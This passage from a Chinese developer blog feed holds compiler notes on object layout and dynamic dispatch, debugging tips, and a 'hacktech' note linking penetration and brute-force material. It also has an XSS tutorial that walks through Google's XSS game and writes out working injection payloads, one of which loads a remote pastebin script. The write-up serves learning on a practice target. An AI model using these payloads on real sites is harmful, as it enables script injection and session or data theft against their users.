class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = <br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">1</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">0</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">2</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">1</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>) ==&gt; x-<span class="hljs-number">1</span>是一个，x-<span class="hljs-number">2</span>是一个，两式相加，会产生一个，所以共两个<br><span class="hljs-attribute">fi</span><br><span class="hljs-attribute">fi</span><br></code></pre></td></tr></table></figure><p>定义NT(e)为表达式e需要多少个临时变量</p><p>对于一个函数定义：<code>f(x1, ..., fn) = e</code>，the AR has<code>2 + NT(e)</code> elements:</p><ul><li>Return</li><li>Frame pointer</li><li>n arguments</li><li>NT(e)</li></ul><p>以下是一些常见的规则：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">NT(<span class="hljs-params">e1</span> + <span class="hljs-params">e2</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>)<br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e1</span>)</span><br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span><br>Of course, space used <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e1 can be reused <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e2<br><br><span class="hljs-constructor">NT(<span class="hljs-params">if</span> <span class="hljs-params">e1</span> = <span class="hljs-params">e2</span> <span class="hljs-params">then</span> <span class="hljs-params">e3</span> <span class="hljs-params">else</span> <span class="hljs-params">e4</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e3</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e4</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>(<span class="hljs-params">e1</span>, <span class="hljs-operator">...</span>, <span class="hljs-params">en</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, ..., <span class="hljs-constructor">NT(<span class="hljs-params">en</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">int</span>)</span> = <span class="hljs-number">0</span><br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>)</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在没有使用临时变量之前：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> - <span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>使用了临时变量之后：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(e1 + e2, nt) = <br>cgen(e1, nt)<br>sw <span class="hljs-variable">$a0</span> nt(<span class="hljs-variable">$fp</span>) <span class="hljs-regexp">//</span> 在偏移量处做压入栈的动作<br><span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> - <span class="hljs-number">4</span> 这样就不用了频繁执行addiu了<br>cgen(e2, nt + <span class="hljs-number">4</span>)<br>lw <span class="hljs-variable">$t1</span> nt(<span class="hljs-variable">$fp</span>)<br>add <span class="hljs-variable">$a0</span> <span class="hljs-variable">$t1</span> <span class="hljs-variable">$a0</span><br>  <span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$a0</span> <span class="hljs-variable">$sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h2 id="object-layout-and-dynamic-dispatch">Object Layout and dynamicdispatch</h2><p>OO(Objetc Oriented) Implementation = Basic code generation + morestuff(面向对象的实现其实就是之前所介绍的基本代码生成+本次要讲的内容)</p><p>OO Slogan：如果B是A的子类，那么B类对象可以用于任何A类的地方：</p><p>eg:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">extends</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">f</span> <span class="hljs-params">(A a)</span> &#123;<br><br>&#125;<br><br>函数f的入参可以是A及其子类<br></code></pre></td></tr></table></figure><p>这就意味着在代码生成的时候，在已经生成完了A类的代码，那么B类(A的子类)可以不用修改其父类(A)的代码，而只是在其基础上进行扩展。</p><p>再介绍对象的代码生成之前，需要考虑以下问题：</p><p><code>对象在内存里如何表示？</code></p><ul><li><p>Objects are laid out int contiguous memory;</p></li><li><p>Each attribute stored at a fixed offset in the object;</p></li><li><p>The attribute is in the same place in every object of thatclass;</p></li><li><p>When a method is invoked, the object is self and the fields arethe object's attributes;</p></li></ul><blockquote><p>为什么对象每个属性都是固定的偏移量呢？这要归结于同一个类可以new多个对象，但这些对象的数据内存是各自独有的，每个对象同一个属性在固定偏移量的内存处，方便获取；而方法是共享的，所以方法单独维护在了一张methodstable中，每个对象都都持有指向这个methods table的指针dispatchpointer，不然不同的对象还要维护各自的方法，这样太费内存了。</p></blockquote><p><code>如何实现动态分配?</code></p><p>answer: Method table and dispatch ptr</p><p>关于动态分配和静态分配的概念：https://lukasatkinson.de/2016/dynamic-vs-static-dispatch/</p><p>其实node里也有静态分配和动态分配的概念：</p><p>wip</p><p><strong>首先介绍下对象布局</strong></p><p>考虑如下🌰，以下内容均围绕该🌰展开：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">A</span> &#123;<br><span class="hljs-selector-tag">a</span>: Int &lt;- <span class="hljs-number">0</span>;<br>d: Int &lt;- <span class="hljs-number">1</span>;<br>f(): Int &#123; <span class="hljs-selector-tag">a</span>&lt;- <span class="hljs-selector-tag">a</span> + d &#125;;<br>&#125;<br><br>class <span class="hljs-selector-tag">B</span> &#123;<br> <span class="hljs-selector-tag">b</span>: Int &lt;- <span class="hljs-number">2</span>;<br> f(): Int &#123; <span class="hljs-selector-tag">a</span> &#125;;<br> g(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- <span class="hljs-selector-tag">a</span> - <span class="hljs-selector-tag">b</span> &#125;;<br>&#125;<br><br>class C &#123;<br>c: Int &lt;- <span class="hljs-number">3</span>;<br>h(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- <span class="hljs-selector-tag">a</span> * c &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>cool objects layout: (下面内存是连续的)</p><table><thead><tr class="header"><th style="text-align: center;">Class tag(int) 类标识符</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Object size(int)</td></tr><tr class="even"><td style="text-align: center;">Dispatch ptr</td></tr><tr class="odd"><td style="text-align: center;">Attribute 1</td></tr><tr class="even"><td style="text-align: center;">Attribute 2</td></tr><tr class="odd"><td style="text-align: center;">...</td></tr></tbody></table><p>其中前3个称为header infomation</p><p>关于继承的子类的内存布局：考虑父类A，其子类B可以通过在A布局之上进行扩展得到，如下：</p><blockquote><p>B is an extension， just leaves the layout of A unchanged</p></blockquote><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th><th>8</th><th>12</th><th>16</th><th>20</th></tr></thead><tbody><tr class="odd"><td>A</td><td>Atag</td><td>5(word)</td><td>dispatch ptr1</td><td>a</td><td>d</td><td></td></tr><tr class="even"><td>B</td><td>Btag</td><td>6(word)</td><td>dispatch ptr2</td><td>a</td><td>d</td><td>b</td></tr><tr class="odd"><td>C</td><td>Ctag</td><td>6(word)</td><td>dispatch ptr3</td><td>a</td><td>d</td><td>c</td></tr></tbody></table><p>The offset for an attribute is the same in a class and all of itssubclass</p><p><strong>介绍下动态分配</strong></p><p>考虑e.f(), 这个表达式e生成之后，该如何调用对象上的方法呢？</p><p>和属性布局一样，对象的方法同样在内存上有着固定的偏移量(包含继承的方法)，只不过这些方法是存在一张dispatchtable里的(其实我个人喜欢称之为methodtable)，这张表提供了索引这些方法的能力，表里存储的是函数地址，如，方法f就是在其附属类的表里的固定偏移量处，当然在其子类也是同样的偏移量；</p><p>为什么同一方法在类和其子类中设计成固定的偏移量呢？wip</p><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th></tr></thead><tbody><tr class="odd"><td>A</td><td>fa</td><td></td></tr><tr class="even"><td>B</td><td>fb</td><td>g</td></tr><tr class="odd"><td>C</td><td>fa</td><td>h</td></tr></tbody></table><p>注：如果fa中海定义了其他方法，则可以</p><p>类的每个方法f都在编译期被分配在dispatch table的固定偏移量O_f处，换句话说，编译器的工作就是找出类的所有方法然后给每个方法分派一个固定的位置。</p><p>综上，为了实现dynamic dispatch<code>e.f()</code>，编译器应该走以下两个步骤：</p><ol type="1"><li>评估表达式e，得到一个对象x；</li><li>call <code>D[Of]</code><ul><li>D is the disptatch table for x</li><li>in the call ,self is bound to x</li></ul></li></ol><h2 id="总结">总结</h2><p>在学习完之后，我们考虑下如果是我们该如何为以下代码设计代码生成</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>a: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">1</span>;<br>f(): <span class="hljs-type">Int</span> &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">1</span>) &#125;;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>b: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">10</span>;<br>g(): int &#123; b;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>m: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">2</span>;<br>f(): int &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">2</span>)&#125;;<br>&#125;<br><br>b: <span class="hljs-type">B</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>();<br>b.g();<br><br>c: <span class="hljs-type">C</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">C</span>();<br>c.f();<br></code></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">评估b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new B();</span><br><span class="hljs-attribute">初始化</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table1</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">10</span><br><br><span class="hljs-attribute">dispath table1</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><span class="hljs-attribute">g</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__g</span><br><br><br><span class="hljs-attribute">评估c</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new C();</span><br><span class="hljs-attribute">初始化c</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table2</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">m</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><br><br><span class="hljs-attribute">dispath table2</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><br>b.g();<br>获取b对象的dispatch table1<br>拿到g方法<br>调用即可<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>debug</title>
    <link href="/emocoder/2023/05/07/debug/"/>
    <url>/emocoder/2023/05/07/debug/</url>
    
    <content type="html"><![CDATA[<h2 id="日志工具">日志工具</h2><p>开发者使用： trace：打印调用堆栈debug：不仅打印调用堆栈，还打印变量信息</p><p>用户使用： info warn：只是警告，但是不影响运行error：报错，但是不影响整个应用程序的继续运行 fatal:中断整个应用程序的执行</p><p>首先</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端，node，调试，debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacktech</title>
    <link href="/emocoder/2023/05/06/hacktech/"/>
    <url>/emocoder/2023/05/06/hacktech/</url>
    
    <content type="html"><![CDATA[<p>内网渗透+爆破：https://blog.csdn.net/m0_46684679/article/details/117854834</p><p>安全集锦：https://www.zhihu.com/column/c_1334810805263515648</p><p>网络防火墙：https://zhuanlan.zhihu.com/p/159088465</p><p>格式: echo -e "\033[字背景颜色;字体颜色m字符串\033[0m"</p><p>-e对特殊字符做转义</p><p>eg: echo -e "\033[41;36m something here \033[0m"</p><p>其中41的位置代表底色, 36的位置是代表字的颜色</p><p>正则通配符和linux通配符是不一样的，<em>（星号）是linux中的通配符，代表一个或一个以上的所有字符。linux的隐藏文件和隐藏文件夹都是以.（点号）开头，所以.</em>应该是代表当前目录下的所有隐藏目录和隐藏文件夹。如果是./*则表示当前目录下的所有文件和所有目录，因为.（点号）还有代表当前目录的意思</p><p>https://zhuanlan.zhihu.com/p/96272363，日志应该是最初开发的一部分其次，结束调试不要删除日志</p><p>写日志的地方： 关键方法调用：时间和调用参数 上下游对接处可能存在异常的地方</p><p>其他console方法： console.count: 用于计算函数被调用的次数console.log.countReset</p><p>console.group: 用于折叠 console.groupCollapsed() console.groupEnd</p><p>consoel.time() console.timeEnd()</p><p>console.table()</p><p>console.dir(obj, { depth: })</p><h2 id="chrome-devtools">Chrome Devtools</h2><p>Network: 查看，过滤网络请求列表，查看请求详情 模拟弱网环境搜索headers以及response内容 使用requeset block</p><p>Source 查看加载的资源文件 编辑css和js，修改css和js snippets管理断点调试 通过workspace关联到本地</p><ol type="1"><li><p>如何让source里的文件树看起来更清晰——查看author-deployed，但是项目必须有source-map</p></li><li><p>如何让call stack中仅出现关心的文件 ——debug ignore list在实际操作里，在stepin的过程中，如果遇到了一个不想调试的文件直接右击文件的代码区域，addignore list，下一次step in的时候就不会出现这个文件了，</p></li></ol><p>如何恢复？ ——顶级settings，找到ignore list</p><ol start="3" type="1"><li><p>如何对js的修改，reload之后还可以生效——overrides，选择本地目录添加到overrides中，</p></li><li><p>如何找出哪一行代码影响了我的元素 ——dom change breakponits比如找到哪一行删除了某个dom节点：右击某个dom节点——》break on-》noderemoval</p></li><li><p>如何找出哪一行代码发起了请求 ——source面板找到xhr/fetchbreakpoints，输入拦截的url即可</p></li><li><p>异常断点：source面板找到break points，勾选pause oncaught/uncaught points 捕获的or未捕获的</p></li><li><p>事件断点 全局事件：source面板找到event listener breakpoints，选择相应的事件即可</p></li><li><p>如何打断点，不会中断？ source 面板，某一行，右击选择edit breakpoints =》选择log points，输入想打印的语句即可</p></li></ol><p>字颜色:30-----------37 30:黑 31:红 32:绿 33:黄 34:蓝色 35:紫色36:深绿 37:白色</p><p>字背景颜色范围:40----47 40:黑 41:深红 42:绿 43:黄色 44:蓝色 45:紫色46:深绿 47:白色</p><p>字体加亮颜色:90------------97 90:黑 91:红 92:绿 93:黄 94:蓝色 95:紫色96:深绿 97:白色</p><p>背景加亮颜色范围:100--------------------107 40:黑 41:深红 42:绿43:黄色 44:蓝色 45:紫色 46:深绿 47:白色</p><p>===============================================ANSI控制码的说明\33[0m 关闭所有属性 \33[1m 设置高亮度 \33[4m 下划线 \33[5m 闪烁 \33[7m反显 \33[8m 消隐 \33[30m -- \33[37m 设置前景色 \33[40m -- \33[47m设置背景色 \33[nA 光标上移n行 \33[nB 光标下移n行 \33[nC 光标右移n行\33[nD 光标左移n行 \33[y;xH设置光标位置 \33[2J 清屏 \33[K清除从光标到行尾的内容 \33[s 保存光标位置 \33[u 恢复光标位置 \33[?25l隐藏光标 \33[?25h 显示光标</p><p>1b[2J1b[$;1H $表示行位</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透，爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXS</title>
    <link href="/emocoder/2023/05/05/xxs/"/>
    <url>/emocoder/2023/05/05/xxs/</url>
    
    <content type="html"><![CDATA[<p>XSS (Cross-sitescripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。</p><h2 id="xss-类型">XSS 类型</h2><p>XSS 大致可以分为 3 个类型</p><p>反射型 （Reflected XSS Attacks） 此种类型的跨站代码存在于 URL中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p><p>存储型（Stored XSS Attacks） 存储型 XSS 脚本攻击是指 Web应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型XSS 具有较强的稳定性。</p><p>DOM-based 型（DOM-based XSS Attacks） DOM-based的跨站脚本攻击是通过修改页面 DOM 节点数据信息而形成的跨站脚本攻击。</p><p>为了更加深切的近距离体验xss，可以登陆下https://xss-game.appspot.com/level3，这个游戏是 Google提供的一个 XSS的小游戏，大家可以自己在浏览器里试试看能不能闯过所有的关卡（可以通过研究Target Code 来找到可以注入代码的地方，如果想不出来可以看看页面上的Hints）。建议尽量不要看提示来挑战。这个游戏一共有 6关，每个关卡利用了各种不同的技巧和方式来插入恶意代码，有些方式确实非常取巧。</p><p>level1: 通过在 query 里拼接 script 元素，而前端代码又是会展示这个query 的，所以没有过滤的话，就直接运行脚本了，直接利用了 url插入脚本，属于反射型</p><p>level2: 用户提交 blog 或者评论，前端会展示这些评论或者 blog，虽然script 元素不会展示，但是像 dom 节点，如 a，img 元素还是会展示的，利用了dom，属于 dom 型，也可以理解为存储型，和存储相关。</p><p>level3:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">chooseTab</span>(<span class="hljs-params">num</span>) &#123;<br>  <span class="hljs-comment">// Dynamically load the appropriate image.</span><br>  <span class="hljs-keyword">var</span> html = <span class="hljs-string">&quot;Image &quot;</span> + <span class="hljs-built_in">parseInt</span>(num) + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>  html += <span class="hljs-string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="hljs-string">&quot;.jpg&#x27; /&gt;&quot;</span>;<br>  $(<span class="hljs-string">&quot;#tabContent&quot;</span>).<span class="hljs-title function_">html</span>(html);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用了在浏览器直接输入 url 的漏洞，前端代码会用 url 里的参数作为 img元素的属性直接拼接，由于没有对这些参数做转义，所以可能会导致恶意代码插入，由于利用了dom 元素，属于 dom 型</p><p>level4: 服务端模板包含如下代码：<img src="/static/loading.gif" onload="startTimer('');"/&gt;而timer是从url的参数里取的，如果这个timer包含了其他的js脚本代码，就会有问题，如下：https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvarb=('</p><p>=&gt; startTimer('');alert(1);var b=('');</p><p>level5: 前端脚本： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>前端直接利用url的参数拼接成了a元素的href属性：https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</p><p>level6: 服务端代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setInnerText</span>(<span class="hljs-params">element, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (element.<span class="hljs-property">innerText</span>) &#123;<br>    element.<span class="hljs-property">innerText</span> = value;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    element.<span class="hljs-property">textContent</span> = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">includeGadget</span>(<span class="hljs-params">url</span>) &#123;<br>  <span class="hljs-keyword">var</span> scriptEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br><br>  <span class="hljs-comment">// This will totally prevent us from loading evil URLs!</span><br>  <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^https?:\/\//</span>)) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&#x27;Sorry, cannot load a URL containing &quot;http&quot;.&#x27;</span><br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Load this awesome gadget</span><br>  scriptEl.<span class="hljs-property">src</span> = url;<br><br>  <span class="hljs-comment">// Show log messages</span><br>  scriptEl.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>), <span class="hljs-string">&quot;Loaded gadget from &quot;</span> + url);<br>  &#125;;<br>  scriptEl.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url<br>    );<br>  &#125;;<br><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(scriptEl);<br>&#125;<br><br><span class="hljs-comment">// Take the value after # and use it as the gadget filename.</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getGadgetName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) || <span class="hljs-string">&quot;/static/gadget.js&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_">includeGadget</span>(<span class="hljs-title function_">getGadgetName</span>());<br></code></pre></td></tr></table></figure><p>这里本来想直接插入script元素的，但是行不通，只有通过script的src外链加载外域脚本：htTps://pastebin.com/raw.php?i=15S5qZs0https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</p><h2 id="更进一步地实验">更进一步地实验</h2><p>因为现在大部分的前后端框架都会有 XSS相关的安全策略，且默认是开启的，平时想要测试一下 XSS的漏洞可能还比较麻烦。针对这种情况，可以使用 Damn Vulnerable WebApplication（https://github.com/digininja/DVWA），它是一个主动关闭了各种安全策略的Web 应用，包括了各种各样漏洞，当然也包括 XSS的部分，可以用来测试自己对这些漏洞的掌握。</p><p>防范手段 防御 